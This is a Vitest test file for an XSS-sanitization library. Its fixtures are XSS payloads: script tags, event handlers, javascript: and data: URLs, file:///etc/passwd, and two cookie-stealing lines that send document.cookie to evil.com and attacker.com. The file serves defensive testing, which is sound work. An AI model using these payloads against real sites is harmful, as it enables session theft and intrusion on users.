import { describe, it, expect } from 'vitest';
import { stripHtml, sanitizeUrl, sanitizeContent, sanitizeProfile } from '../lib/inputSanitization';

describe('Input Sanitization - XSS Protection', () => {
  describe('stripHtml()', () => {
    it('should remove script tags (content becomes visible text)', () => {
      const malicious = '<script>alert("XSS")</script>Hello';
      const result = stripHtml(malicious);
      expect(result).toContain('Hello');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('</script>');
    });

    it('should remove event handlers from HTML', () => {
      const malicious = '<div onclick="malicious()">Click me</div>';
      const result = stripHtml(malicious);
      expect(result).toBe('Click me');
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('malicious');
    });

    it('should remove all HTML tags but preserve text', () => {
      const input = '<p>Hello <strong>World</strong></p>';
      const result = stripHtml(input);
      expect(result).toBe('Hello World');
    });

    it('should handle multiple script tag removals', () => {
      const malicious = '<script>bad()</script>Text<script>worse()</script>';
      const result = stripHtml(malicious);
      expect(result).toContain('Text');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('</script>');
    });

    it('should handle empty and whitespace-only input', () => {
      expect(stripHtml('')).toBe('');
      expect(stripHtml('   ')).toBe('');
    });

    it('should preserve plain text without HTML', () => {
      const plain = 'Just plain text';
      expect(stripHtml(plain)).toBe('Just plain text');
    });
  });

  describe('sanitizeUrl()', () => {
    it('should allow valid HTTP URLs', () => {
      const url = 'http://example.com/page';
      expect(sanitizeUrl(url)).toBe(url);
    });

    it('should allow valid HTTPS URLs', () => {
      const url = 'https://secure.example.com/path?query=1';
      expect(sanitizeUrl(url)).toBe(url);
    });

    it('should block javascript: protocol', () => {
      const malicious = 'javascript:alert("XSS")';
      expect(sanitizeUrl(malicious)).toBeNull();
    });

    it('should block data: protocol', () => {
      const malicious = 'data:text/html,<script>alert("XSS")</script>';
      expect(sanitizeUrl(malicious)).toBeNull();
    });

    it('should block file: protocol', () => {
      const malicious = 'file:///etc/passwd';
      expect(sanitizeUrl(malicious)).toBeNull();
    });

    it('should return null for invalid URLs', () => {
      expect(sanitizeUrl('not a url')).toBeNull();
      expect(sanitizeUrl('htp://typo.com')).toBeNull();
    });

    it('should handle null and undefined gracefully', () => {
      expect(sanitizeUrl(null)).toBeNull();
      expect(sanitizeUrl(undefined)).toBeNull();
    });

    it('should handle empty string', () => {
      expect(sanitizeUrl('')).toBeNull();
    });
  });

  describe('sanitizeContent() - Posts, Comments, Proposals', () => {
    it('should sanitize text content with HTML patterns', () => {
      const input = '<script>alert(1)</script>Safe text';
      const result = sanitizeContent(input);
      expect(result).not.toContain('script');
      expect(result).toContain('Safe text');
    });

    it('should preserve content without HTML', () => {
      const input = 'Normal post content';
      const result = sanitizeContent(input);
      expect(result).toBe('Normal post content');
    });

    it('should handle empty content', () => {
      const input = '';
      const result = sanitizeContent(input);
      expect(result).toBe('');
    });
  });

  describe('sanitizeProfile() - User Profiles', () => {
    it('should sanitize username and bio (username gets lowercased)', () => {
      const input = {
        username: '<script>bad</script>ValidUser',
        bio: '<img onerror="alert(1)">About me',
      };
      const result = sanitizeProfile(input);
      // Username is lowercased and HTML tags removed
      expect(result.username).toBe('badvaliduser');
      expect(result.username).not.toContain('<');
      expect(result.bio).toContain('About me');
      expect(result.bio).not.toContain('onerror');
    });

    it('should handle optional bio field (username gets lowercased)', () => {
      const input = { username: 'User123' };
      const result = sanitizeProfile(input);
      // Username is automatically lowercased
      expect(result.username).toBe('user123');
      expect(result.bio).toBeUndefined();
    });
  });
});

describe('Regression Tests - Ensure Sanitization Coverage', () => {
  describe('Critical User-Generated Content Fields', () => {
    it('should prevent XSS in post content', () => {
      const maliciousPost = '<iframe src="javascript:alert(1)"></iframe>Real content';
      const sanitized = stripHtml(maliciousPost);
      expect(sanitized).not.toContain('iframe');
      expect(sanitized).not.toContain('javascript');
      expect(sanitized).toBe('Real content');
    });

    it('should prevent XSS in comment content', () => {
      const maliciousComment = '<img src=x onerror="fetch(\'evil.com?cookie=\'+document.cookie)">Comment';
      const sanitized = stripHtml(maliciousComment);
      expect(sanitized).not.toContain('img');
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).toBe('Comment');
    });

    it('should prevent XSS in channel names by removing HTML tags', () => {
      const maliciousName = '<marquee>Channel</marquee><script>alert(1)</script>';
      const sanitized = stripHtml(maliciousName);
      expect(sanitized).toContain('Channel');
      expect(sanitized).not.toContain('<marquee>');
      expect(sanitized).not.toContain('<script>');
    });

    it('should prevent XSS in debate titles', () => {
      const maliciousTitle = '<svg/onload=alert(1)>Debate Title';
      const sanitized = stripHtml(maliciousTitle);
      expect(sanitized).not.toContain('svg');
      expect(sanitized).not.toContain('onload');
    });

    it('should prevent XSS in proposal descriptions', () => {
      const malicious = '<details open ontoggle=alert(1)>Description';
      const sanitized = stripHtml(malicious);
      expect(sanitized).not.toContain('details');
      expect(sanitized).not.toContain('ontoggle');
    });

    it('should block malicious URLs in source links', () => {
      const maliciousUrl = 'javascript:void(document.location="http://attacker.com?cookie="+document.cookie)';
      const sanitized = sanitizeUrl(maliciousUrl);
      expect(sanitized).toBeNull();
    });
  });

  describe('Edge Cases - Complex XSS Vectors', () => {
    it('should handle nested script tags by removing all HTML tags', () => {
      const nested = '<script><script>alert(1)</script></script>Text';
      const sanitized = stripHtml(nested);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
      expect(sanitized).toContain('Text');
    });

    it('should handle HTML entities in script tags', () => {
      const entities = '&lt;script&gt;alert(1)&lt;/script&gt;Safe';
      const sanitized = stripHtml(entities);
      // HTML entities should be decoded and tags removed
      expect(sanitized).not.toContain('&lt;');
      expect(sanitized).not.toContain('&gt;');
    });

    it('should handle case variations in protocols', () => {
      expect(sanitizeUrl('JavaScript:alert(1)')).toBeNull();
      expect(sanitizeUrl('JAVASCRIPT:alert(1)')).toBeNull();
      expect(sanitizeUrl('JaVaScRiPt:alert(1)')).toBeNull();
    });

    it('should handle whitespace in protocols', () => {
      expect(sanitizeUrl('java\nscript:alert(1)')).toBeNull();
      expect(sanitizeUrl('java\tscript:alert(1)')).toBeNull();
    });
  });

  describe('Performance - Large Inputs', () => {
    it('should handle very long strings without crashing', () => {
      const longString = '<script>'.repeat(10000) + 'Text' + '</script>'.repeat(10000);
      const result = stripHtml(longString);
      expect(result).toBe('Text');
    });

    it('should handle URLs with very long paths', () => {
      const longPath = 'https://example.com/' + 'a'.repeat(10000);
      const result = sanitizeUrl(longPath);
      expect(result).toBeTruthy();
    });
  });
});
